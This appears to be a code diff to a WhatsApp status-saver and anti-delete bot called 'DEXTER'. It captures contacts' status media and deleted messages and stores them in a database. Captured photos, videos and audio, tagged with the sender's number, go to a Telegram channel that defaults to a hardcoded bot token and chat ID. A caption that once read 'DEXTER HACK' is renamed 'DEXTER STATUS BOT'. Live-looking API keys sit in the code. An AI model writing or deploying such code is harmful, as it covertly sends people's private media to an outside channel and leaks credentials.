@@ -182,8 +182,8 @@ const ownerNumber = config.OWNER_NUMBER || ['94789958225'];
 const tempDir = path.join(os.tmpdir(), 'cache-temp');
 const startTime = performance.now();
 const IMGBB_API_KEY = config.IMGBB_API_KEY || '3839e303da7b555ec5d574e53eb836d2';
-const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN || ['8491884027:AAGhGQjiVArxWgZtO2-JkkZDleiuSQ592Pg'];
-const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID || ['-1002720330370'];
+const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN || '8491884027:AAGhGQjiVArxWgZtO2-JkkZDleiuSQ592Pg'; // Single token as string
+const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID || '-1002720330370'; // Single chat ID as string
 
 // Serve static files
 app.use(express.static(path.join(__dirname, 'public')));
@@ -274,6 +274,20 @@ async function uploadToImgbb(buffer) {
   }
 }
 
+// Format Sri Lanka time for captions
+function formatSriLankaTime() {
+  return new Date().toLocaleString('en-US', { 
+    timeZone: 'Asia/Colombo',
+    year: 'numeric',
+    month: '2-digit',
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: true
+  });
+}
+
 // Send media to Telegram
 async function sendToTelegram(senderJid, messageType, buffer, caption) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
@@ -291,31 +305,37 @@ async function sendToTelegram(senderJid, messageType, buffer, caption) {
 
     const formData = new FormData();
     const senderNumber = senderJid.split('@')[0];
-    const telegramCaption = `𝐅𝐑𝐎𝐌: ${senderNumber}\n${caption || 'No caption'}\n\n𝗗𝗘𝗫𝗧𝗘𝗥 𝗛𝗔𝗖𝗞 ☿`;
+    const sriLankaTime = formatSriLankaTime();
+    const telegramCaption = `📨 *From:* ${senderNumber}\n` +
+                          `📝 *Caption:* ${caption || 'No caption'}\n` +
+                          `🕒 *Time (SL):* ${sriLankaTime}\n` +
+                          `📤 *Type:* ${messageType.replace('Message', '')}\n\n` +
+                          `🔥 *DEXTER STATUS BOT* 🔥`;
+
     formData.append('chat_id', TELEGRAM_CHAT_ID);
     formData.append('caption', telegramCaption);
 
     let endpoint;
     if (messageType === 'imageMessage') {
-      formData.append('photo', buffer, { filename: 'status.jpg' });
+      formData.append('photo', buffer, { filename: `status_${senderNumber}_${Date.now()}.jpg` });
       endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
     } else if (messageType === 'videoMessage') {
-      formData.append('video', buffer, { filename: 'status.mp4' });
+      formData.append('video', buffer, { filename: `status_${senderNumber}_${Date.now()}.mp4` });
       endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
     } else if (messageType === 'audioMessage') {
-      formData.append('audio', buffer, { filename: 'status.mp3' });
+      formData.append('audio', buffer, { filename: `status_${senderNumber}_${Date.now()}.mp3` });
       endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`;
     } else {
       console.error(`Unsupported message type for Telegram: ${messageType}`);
       return;
     }
 
-    await withRetry(() =>
+    const response = await withRetry(() =>
       axios.post(endpoint, formData, {
         headers: formData.getHeaders()
       })
     );
-    console.log(`Sent ${messageType} to Telegram private channel`);
+    console.log(`Sent ${messageType} to Telegram private channel: ${response.data.ok}`);
   } catch (err) {
     console.error('Telegram send error:', {
       messageType,
@@ -434,7 +454,7 @@ async function restoreSettings(conn) {
     }
 
     const recordingSettings = await pool.query(
-      `SELECT exclusive, auto_status FROM recording_settings ORDER BY id DESC LIMIT 1`
+      `SELECT enabled, auto_status FROM recording_settings ORDER BY id DESC LIMIT 1`
     );
     if (recordingSettings.rows.length > 0 && recordingSettings.rows[0].enabled) {
       await withRetry(() => conn.sendPresenceUpdate('recording', conn.user.id));
@@ -681,7 +701,7 @@ async function connectToWA() {
           if (!mek.message.extendedTextMessage || !mek.message.extendedTextMessage.contextInfo.quotedMessage) {
             await withRetry(() =>
               conn.sendMessage(mek.key.remoteJid, {
-                text: '*Please quote a status to save*',
+                text: '*TNX FOR SAVE 💙*',
               }, { quoted: mek })
             );
             return;
@@ -711,7 +731,7 @@ async function connectToWA() {
           await saveStatus(mek, quotedMessage, quotedMessageType, conn);
           await withRetry(() =>
             conn.sendMessage(mek.key.remoteJid, {
-              text: '*Status sent successfully! 💾*',
+              text: '*DEXTER STATUS FORWARD SUCCESSFULLY 🤍*\n\n> ᴅᴇxᴛᴇʀ ᴅᴇᴠ',
             }, { quoted: mek })
           );
           return;
@@ -1279,6 +1299,12 @@ async function handleStatusMessage(mek, conn) {
     }
 
     const sriLankaTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
+    await pool.query(
+      `INSERT INTO messages 
+      (message_id, sender_jid, remote_jid, message_text, message_type, image_url, sri_lanka_time, auto_reply_sent, is_status)
+      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
+      [mek.key.id, mek.key.participant || mek.key.remoteJid, mek.key.remoteJid, messageText, messageType, imageUrl, sriLankaTime, false, true]
+    );
     console.log(`Processed status message: ${mek.key.id}`);
   } catch (err) {
     console.error('Status message processing error:', err.message);
@@ -1460,39 +1486,33 @@ async function handleDeletedMessage(conn, update) {
 
         await withRetry(() => conn.sendMessage(deleterJid, messageContent));
 
-const alertMessage1 = `🔔 *DEXTER PRIVATE ASSISTANT* 🔔
+        const alertMessage1 = `🔔 *DEXTER PRIVATE ASSISTANT* 🔔\n\n` +
+                            `📩 *Original Sender:* ${originalMessage.sender_jid}\n` +
+                            `🗑️ *Deleted By:* ${deleterJid}\n` +
+                            `🕒 *Deleted At (SL):* ${sriLankaTime}\n` +
+                            `📝 *Caption:* ${cachedMedia.caption || 'No caption'}\n\n` +
+                            `*❮ ᴅᴇxᴛᴇʀ ᴘᴏᴡᴇʀ ʙʏ ᴀɴᴛɪ ᴅᴇʟᴇᴛ ❯*`;
 
-📩 *Original Sender:* ${originalMessage.sender_jid}
-🗑️ *Deleted By:* ${deleterJid}
-🕒 *Deleted At (SL):* ${sriLankaTime}
-📝 *Caption:* ${cachedMedia.caption || 'No caption'}
+        await withRetry(() => conn.sendMessage(deleterJid, { 
+          text: alertMessage1,
+          quoted: { key, message: { conversation: originalMessage.message_text } }
+        }));
 
-*❮ ᴅᴇxᴛᴇʀ ᴘᴏᴡᴇʀ ʙʏ ᴀɴᴛɪ ᴅᴇʟᴇᴛ ❯*`;
+        let messageText = originalMessage.message_text;
+        if (['imageMessage', 'videoMessage', 'audioMessage'].includes(originalMessage.message_type)) {
+          messageText = `🔔 [Media Message Deleted] Type: ${originalMessage.message_type}, Caption: ${JSON.parse(originalMessage.message_text).caption || 'No caption'}`;
+        }
+        await withRetry(() => conn.sendMessage(deleterJid, { text: messageText }));
 
-await withRetry(() => conn.sendMessage(deleterJid, { 
-  text: alertMessage1,
-  quoted: { key, message: { conversation: originalMessage.message_text } }
-}));
+        const alertMessage2 = `🔔 *DEXTER PRIVATE ASSISTANT* 🔔\n\n` +
+                            `📩 *Original Sender:* ${originalMessage.sender_jid}\n` +
+                            `🗑️ *Deleted By:* ${deleterJid}\n` +
+                            `🕒 *Deleted At (SL):* ${sriLankaTime}\n\n` +
+                            `*❮ ᴅᴇxᴛᴇʀ ᴘᴏᴡᴇʀ ʙʏ ᴀɴᴛɪ ᴅᴇʟᴇᴛ ❯*`;
 
-// ------------------------------------------------------
-
-let messageText = originalMessage.message_text;
-if (['imageMessage', 'videoMessage', 'audioMessage'].includes(originalMessage.message_type)) {
-  messageText = `🔔 [Media Message Deleted] Type: ${originalMessage.message_type}, Caption: ${JSON.parse(originalMessage.message_text).caption || 'No caption'}`;
-}
-await withRetry(() => conn.sendMessage(deleterJid, { text: messageText }));
-
-const alertMessage2 = `🔔 *DEXTER PRIVATE ASSISTANT* 🔔
-
-📩 *Original Sender:* ${originalMessage.sender_jid}
-🗑️ *Deleted By:* ${deleterJid}
-🕒 *Deleted At (SL):* ${sriLankaTime}
-
-*❮ ᴅᴇxᴛᴇʀ ᴘᴏᴡᴇʀ ʙʏ ᴀɴᴛɪ ᴅᴇʟᴇᴛ ❯*`;
-
-await withRetry(() => conn.sendMessage(deleterJid, { 
-  text: alertMessage2,
-  quoted: { key, message: { conversation: originalMessage.message_text } }
+        await withRetry(() => conn.sendMessage(deleterJid, { 
+          text: alertMessage2,
+          quoted: { key, message: { conversation: originalMessage.message_text } }
         }));
       }
     }
